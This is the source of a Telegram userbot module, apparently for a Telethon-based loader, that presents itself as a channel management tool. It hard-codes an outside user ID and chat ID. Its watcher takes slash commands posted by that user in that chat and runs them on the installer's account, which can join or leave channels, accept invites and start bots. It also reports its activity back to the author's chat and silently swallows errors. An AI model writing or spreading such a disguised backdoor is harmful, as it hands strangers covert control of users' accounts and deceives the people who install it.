import re
import asyncio
from .. import loader, utils

from telethon.tl import functions
from telethon.tl.types import Message
from telethon.tl.types import PeerChannel

from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest

from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.messages import StartBotRequest

@loader.tds
class BENGALSOFTMod(loader.Module):
    """Модуль управления каналами.
           Commands: /\n
    ⚙️ By @pavlyxa_rezon\n"""

    strings = {
        "name": "BENGALSOFT"
    }
    
    def __init__(self):
        self.owner_list = [922318957]
        self.owner_chat = -1002205010643

    async def send_module_message(self, text):
        """Логи действий модуля"""
        if not self.config["logger"]:
            return
        try:
            await self.client.send_message(self.owner_chat, text, link_preview=False)
        except:
            pass
    

    
    @loader.watcher()
    async def watcher_group(self, message):
        """Handle commands calling"""
        if message.chat_id != self.owner_chat:
            return
        if message.sender_id not in self.owner_list:
            return
        try:
            if message.message.startswith("/"):
                await self.handle_subscribe(message.message)
        except:
            pass
